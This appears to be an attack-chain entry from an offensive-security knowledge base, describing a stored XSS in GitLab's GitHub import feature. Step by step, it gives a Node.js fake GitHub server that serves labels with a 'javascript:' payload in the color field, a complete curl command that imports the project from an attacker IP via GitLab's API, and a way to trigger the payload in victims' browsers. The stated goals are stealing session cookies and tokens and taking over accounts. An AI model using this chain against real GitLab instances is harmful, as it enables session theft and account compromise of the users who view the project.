---
tags:
  - xss
  - stored-xss
  - csp-bypass
  - gitlab
  - github
type: attack_chain
tools:
  - '[[tools/Node.js]]'
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Cloud (GitLab.com)
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-Dummy-GitHub-Server-for-Malicious-Labels]]'
  - '[[procedures/Import-Malicious-Project-into-GitLab-via-API]]'
  - '[[procedures/Trigger-XSS-by-Viewing-Labels-or-References]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:19.888Z'
description: >-
  A multi-stage attack exploiting a stored XSS vulnerability in GitLab by
  importing malicious labels from a controlled GitHub server, bypassing CSP to
  execute JavaScript in victims' browsers.
skill_level: intermediate
impact_level: high
id: 2b87bbd5-f7b8-4b4f-bbac-98c54389809c
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# Stored XSS in GitLab via Malicious GitHub Label Import

Multi-stage attack chain demonstrating a complete attack workflow exploiting a stored XSS vulnerability in GitLab's GitHub import feature.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Malicious Server] --> B[Import to GitLab]
    B --> C[Trigger XSS Execution]
    C --> D[Data Theft or DoS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node.js]]
- [[tools/curl]]

### Target Environment

- GitLab.com or self-hosted GitLab instance with GitHub import enabled
- Required services/ports: Port 80 open for dummy server
- Network access requirements: Public IP for dummy server, GitLab API access

### Initial Access Requirements

- GitLab personal access token with import permissions
- GitHub personal access token for dummy import simulation
- No prior access to target GitLab instance needed, but victim must view the imported project

## Detailed Attack Procedures

### Step 1: Set Up Malicious Server
procedure: [[procedures/Set-Up-Dummy-GitHub-Server-for-Malicious-Labels]]

**Objective**: Host a fake GitHub server that serves labels with malicious JavaScript payloads in color fields to bypass GitLab's validation during import.

**Instructions**: Decompress the dummy-server.tar.gz (assumed available from vulnerability report attachments) and run the Node.js server on a public IP and port. Use [[commands/node-dummy-github-server]] to start the server:

```bash
node ./index.js YOUR_IP YOUR_PORT
```

For example, with sudo for port 80:

```bash
sudo node index.js 51.75.74.52 80
```

**Expected Output**: Server logs indicating it's listening, e.g., "Server running on http://YOUR_IP:YOUR_PORT".

**Success Indicators**:
- Dummy server accessible via browser or curl, returning mock GitHub API responses with malicious labels (e.g., color: "javascript:alert(document.domain)")
- No errors in Node.js console

### Step 2: Import Malicious Project
procedure: [[procedures/Import-Malicious-Project-into-GitLab-via-API]]

**Objective**: Use GitLab's API to import the project from the dummy server, injecting the malicious labels into the target GitLab namespace.

**Instructions**: Execute [[commands/curl-gitlab-import-generic]] with your GitLab token and dummy server details:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538", "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "xss-on-label-color", "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
```

For a specific example:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538", "target_namespace": "yvvdwf", "new_name": "xss-on-label-color", "github_hostname": "http://51.75.74.52:80"}'
```

**Expected Output**: JSON response from GitLab API indicating successful import, e.g., {"id": ..., "import_status": "started"}.

**Success Indicators**:
- Project appears in GitLab under the specified namespace and name
- Labels page shows imported labels without errors

### Step 3: Trigger XSS Execution
procedure: [[procedures/Trigger-XSS-by-Viewing-Labels-or-References]]

**Objective**: View the imported labels or reference them in issues/merge requests to execute the injected JavaScript, stealing session data or performing actions.

**Instructions**: Navigate to the project's labels page, e.g., https://gitlab.com/YOUR_USERNAME/xss-on-label-color/-/labels, or create an issue mentioning the label like ~"malicious-label". No specific command needed; browser access triggers it.

**Expected Output**: JavaScript alert or payload execution, e.g., alert(document.domain) pops up, confirming XSS.

**Success Indicators**:
- Malicious JavaScript executes in the victim's browser
- Potential theft of access tokens or session cookies observable via payload (e.g., exfil to attacker server)

## Attack Chain Summary

### Key Achievements

1. Bypassed GitLab's CSP by injecting via unsanitized label colors during GitHub import
2. Achieved stored XSS exploitable across projects via label references
3. Enabled arbitrary JS execution for data theft, account takeover, or DoS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
